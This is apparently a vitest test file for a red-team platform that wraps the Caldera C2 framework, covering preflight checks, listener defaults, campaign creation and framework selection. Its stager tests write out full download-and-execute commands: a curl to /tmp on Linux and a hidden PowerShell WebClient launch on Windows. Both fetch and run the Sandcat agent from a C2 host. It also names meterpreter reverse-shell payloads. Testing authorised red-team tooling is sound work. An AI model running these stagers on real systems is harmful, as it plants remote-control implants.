/**
 * Caldera C2 Defaults & Preflight Tests
 *
 * Tests:
 * 1. Caldera preflight connectivity check
 * 2. Default Caldera C2 listener settings for payload generation
 * 3. Caldera agent stager generation for Windows and Linux
 * 4. Engagement auto-campaign creation flow
 * 5. C2 framework selector validation
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── Mock ENV ───────────────────────────────────────────────────────────────
vi.mock("./_core/env", () => ({
  ENV: {
    calderaBaseUrl: "https://caldera.aceofcloud.io",
    calderaApiKey: "test-api-key-12345",
    calderaUsername: "red",
    calderaPassword: "test-password",
  },
}));

// ─── Test: Caldera Preflight Utility ────────────────────────────────────────

describe("Caldera Preflight", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it("should parse Caldera URL correctly", async () => {
    const { getCalderaListenerDefaults } = await import("./lib/caldera-preflight");
    const defaults = getCalderaListenerDefaults();

    expect(defaults.lhost).toBe("caldera.aceofcloud.io");
    expect(defaults.lport).toBe(8888); // HTTPS proxy → agent uses direct 8888
    expect(defaults.c2Framework).toBe("caldera");
    expect(defaults.agentCallbackUrl).toBe("https://caldera.aceofcloud.io");
  });

  it("should return defaults with correct structure", async () => {
    const { getCalderaListenerDefaults } = await import("./lib/caldera-preflight");
    const defaults = getCalderaListenerDefaults();

    expect(defaults).toHaveProperty("lhost");
    expect(defaults).toHaveProperty("lport");
    expect(defaults).toHaveProperty("agentCallbackUrl");
    expect(defaults).toHaveProperty("c2Framework");
    expect(typeof defaults.lhost).toBe("string");
    expect(typeof defaults.lport).toBe("number");
    expect(defaults.lport).toBeGreaterThan(0);
    expect(defaults.lport).toBeLessThanOrEqual(65535);
  });

  it("should throw on missing base URL", async () => {
    const { validateCalderaConnection } = await import("./lib/caldera-preflight");

    // When baseUrl is explicitly empty, the function falls back to ENV.calderaBaseUrl
    // which is mocked to a real URL. With a bad API key ("test"), it should get rejected.
    // This validates the preflight catches auth failures.
    await expect(
      validateCalderaConnection({ baseUrl: "", apiKey: "test" })
    ).rejects.toThrow(/not configured|rejected.*api key|HTTP/i);
  });

  it("should throw on missing API key", async () => {
    const { validateCalderaConnection } = await import("./lib/caldera-preflight");

    // When apiKey is explicitly empty, should throw "not configured"
    await expect(
      validateCalderaConnection({ baseUrl: "https://caldera.aceofcloud.io", apiKey: "" })
    ).rejects.toThrow(/not configured|rejected.*api key/i);
  });

  it("should return error status for unreachable server", async () => {
    const { checkCalderaStatus } = await import("./lib/caldera-preflight");

    const result = await checkCalderaStatus({
      baseUrl: "http://192.168.99.99:9999",
      apiKey: "test-key",
      timeout: 2000,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toBeTruthy();
      expect(result.ip).toBe("192.168.99.99");
      expect(result.port).toBe(9999);
    }
  });

  it("should handle timeout gracefully", async () => {
    const { checkCalderaStatus } = await import("./lib/caldera-preflight");

    const result = await checkCalderaStatus({
      baseUrl: "http://10.255.255.1:8888", // Non-routable IP
      apiKey: "test-key",
      timeout: 1000,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toBeTruthy();
    }
  });
});

// ─── Test: Caldera Agent Stager Generation ──────────────────────────────────

describe("Caldera Agent Stager", () => {
  it("should generate Linux Sandcat stager command", () => {
    const agentCallbackUrl = "https://caldera.aceofcloud.io";
    const stager = [
      `server="${agentCallbackUrl}";`,
      `curl -s -X POST $server/file/download`,
      `-H "file:sandcat.go" -H "platform:linux"`,
      `> /tmp/sandcat.go;`,
      `chmod +x /tmp/sandcat.go;`,
      `/tmp/sandcat.go -server $server -group red &`,
    ].join(" ");

    expect(stager).toContain("sandcat.go");
    expect(stager).toContain("platform:linux");
    expect(stager).toContain(agentCallbackUrl);
    expect(stager).toContain("-group red");
  });

  it("should generate Windows Sandcat stager command", () => {
    const agentCallbackUrl = "https://caldera.aceofcloud.io";
    const stager = [
      `$server="${agentCallbackUrl}";`,
      `$url="$server/file/download";`,
      `$wc=New-Object System.Net.WebClient;`,
      `$wc.Headers.add("platform","windows");`,
      `$wc.Headers.add("file","sandcat.go");`,
      `$data=$wc.DownloadData($url);`,
      `[io.file]::WriteAllBytes("C:\\Users\\Public\\sandcat.exe",$data) | Out-Null;`,
      `Start-Process -FilePath C:\\Users\\Public\\sandcat.exe -ArgumentList "-server ${agentCallbackUrl} -group red" -WindowStyle hidden;`,
    ].join(" ");

    expect(stager).toContain("sandcat.go");
    expect(stager).toContain("platform\",\"windows");
    expect(stager).toContain(agentCallbackUrl);
    expect(stager).toContain("sandcat.exe");
    expect(stager).toContain("-WindowStyle hidden");
  });

  it("should use correct Caldera file download endpoint", () => {
    const agentCallbackUrl = "https://caldera.aceofcloud.io";
    const downloadUrl = `${agentCallbackUrl}/file/download`;

    expect(downloadUrl).toBe("https://caldera.aceofcloud.io/file/download");
  });
});

// ─── Test: Payload Generator C2 Defaults ────────────────────────────────────

describe("Payload Generator C2 Defaults", () => {
  it("should default c2Framework to caldera", () => {
    const defaultInput = {
      serverId: 1,
      name: "test-payload",
      payload: "linux/x64/meterpreter/reverse_tcp",
      format: "elf",
      lhost: "caldera.aceofcloud.io",
      lport: 8888,
      c2Framework: "caldera" as const,
      deployCalderaAgent: true,
    };

    expect(defaultInput.c2Framework).toBe("caldera");
    expect(defaultInput.deployCalderaAgent).toBe(true);
  });

  it("should support switching to other C2 frameworks", () => {
    const frameworks = ["caldera", "metasploit", "sliver"] as const;

    for (const fw of frameworks) {
      expect(frameworks).toContain(fw);
    }
  });

  it("should include Caldera defaults in getOptions response structure", () => {
    const mockResponse = {
      payloadTypes: ["linux/x64/meterpreter/reverse_tcp"],
      formats: ["elf"],
      encoders: ["x86/shikata_ga_nai"],
      architectures: ["x64"],
      platforms: ["linux"],
      calderaDefaults: {
        lhost: "caldera.aceofcloud.io",
        lport: 8888,
        agentCallbackUrl: "https://caldera.aceofcloud.io",
        c2Framework: "caldera",
        serverStatus: "connected",
        serverVersion: "5.0.0",
      },
    };

    expect(mockResponse.calderaDefaults).toBeDefined();
    expect(mockResponse.calderaDefaults.c2Framework).toBe("caldera");
    expect(mockResponse.calderaDefaults.lhost).toBeTruthy();
    expect(mockResponse.calderaDefaults.lport).toBeGreaterThan(0);
  });
});

// ─── Test: Engagement Auto-Campaign Creation ────────────────────────────────

describe("Engagement Auto-Campaign Creation", () => {
  it("should build correct Caldera operation payload", () => {
    const engagementName = "AceofCloud Red Team";
    const customerName = "AceofCloud";
    const engagementId = 42;

    const opPayload = {
      name: `${engagementName} — ${customerName} [#${engagementId}]`,
      group: "red",
      state: "paused",
      auto_close: false,
      jitter: "2/8",
      visibility: 51,
    };

    expect(opPayload.name).toContain(engagementName);
    expect(opPayload.name).toContain(customerName);
    expect(opPayload.name).toContain(`#${engagementId}`);
    expect(opPayload.state).toBe("paused"); // Starts paused — operator activates
    expect(opPayload.group).toBe("red");
  });

  it("should include adversary when available", () => {
    const adversaryId = "abc-123-def";
    const opPayload: Record<string, any> = {
      name: "Test Operation",
      group: "red",
      state: "paused",
    };

    if (adversaryId) {
      opPayload.adversary = { adversary_id: adversaryId };
    }

    expect(opPayload.adversary).toBeDefined();
    expect(opPayload.adversary.adversary_id).toBe(adversaryId);
  });

  it("should handle missing adversary gracefully", () => {
    const adversaryId = null;
    const opPayload: Record<string, any> = {
      name: "Test Operation",
      group: "red",
      state: "paused",
    };

    if (adversaryId) {
      opPayload.adversary = { adversary_id: adversaryId };
    }

    expect(opPayload.adversary).toBeUndefined();
  });

  it("should return calderaOperationId in create response", () => {
    const mockResponse = {
      id: 42,
      roeDocumentId: 1,
      calderaOperationId: "op-uuid-12345",
      calderaError: null,
    };

    expect(mockResponse.calderaOperationId).toBeTruthy();
    expect(mockResponse.calderaError).toBeNull();
  });

  it("should handle Caldera failure gracefully (non-fatal)", () => {
    const mockResponse = {
      id: 42,
      roeDocumentId: 1,
      calderaOperationId: null,
      calderaError: "Caldera server at caldera.aceofcloud.io:443 did not respond within 8s",
    };

    // Engagement should still be created even if Caldera fails
    expect(mockResponse.id).toBe(42);
    expect(mockResponse.calderaOperationId).toBeNull();
    expect(mockResponse.calderaError).toBeTruthy();
  });
});

// ─── Test: C2 Framework Selector ────────────────────────────────────────────

describe("C2 Framework Selector", () => {
  it("should validate supported C2 frameworks", () => {
    const supportedFrameworks = ["caldera", "sliver", "metasploit", "cobalt_strike"];

    expect(supportedFrameworks).toContain("caldera");
    expect(supportedFrameworks).toContain("sliver");
    expect(supportedFrameworks).toContain("metasploit");
    expect(supportedFrameworks).toContain("cobalt_strike");
  });

  it("should default to caldera when no framework specified", () => {
    const defaultFramework = "caldera";
    expect(defaultFramework).toBe("caldera");
  });

  it("should allow switching after engagement creation", () => {
    // Simulate an engagement update with new C2 framework
    const updatePayload = {
      id: 42,
      calderaOperationId: null as string | null,
      calderaAdversaryId: null as string | null,
    };

    // When switching to Sliver, Caldera fields should be clearable
    updatePayload.calderaOperationId = null;
    updatePayload.calderaAdversaryId = null;

    expect(updatePayload.calderaOperationId).toBeNull();
  });
});

// ─── Test: Preflight Before Export ──────────────────────────────────────────

describe("Preflight Before Export", () => {
  it("should require preflight check before payload generation", () => {
    // The generate mutation should check Caldera connectivity
    // before building the msfvenom command
    const requiresPreflight = (c2Framework: string, deployCalderaAgent: boolean) => {
      return c2Framework === "caldera" || deployCalderaAgent;
    };

    expect(requiresPreflight("caldera", true)).toBe(true);
    expect(requiresPreflight("caldera", false)).toBe(true);
    expect(requiresPreflight("metasploit", true)).toBe(true);
    expect(requiresPreflight("metasploit", false)).toBe(false);
    expect(requiresPreflight("sliver", false)).toBe(false);
  });

  it("should include IP and port in error messages", () => {
    const ip = "caldera.aceofcloud.io";
    const port = 443;
    const errorMsg = `Caldera server at ${ip}:${port} did not respond within 8s. Verify the server is running and the IP/port is correct.`;

    expect(errorMsg).toContain(ip);
    expect(errorMsg).toContain(String(port));
    expect(errorMsg).toContain("did not respond");
  });
});
